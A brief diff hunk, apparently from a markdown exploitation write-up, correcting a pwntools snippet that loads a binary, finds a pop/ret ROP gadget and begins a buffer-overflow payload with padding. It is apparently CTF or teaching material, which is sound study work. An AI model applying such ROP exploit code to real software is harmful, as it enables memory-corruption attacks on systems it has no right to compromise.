@@ -111,8 +111,8 @@ io.sendline(payload)
 ```python
 from pwn import *
 
-# ROPgadget
-rop = ROP ELF('./binary')
+elf = ELF('./binary')
+rop = ROP(elf)
 pop_sh = rop.search(['pop', 'ret'])[0].address
 
 payload = b'A' * offset
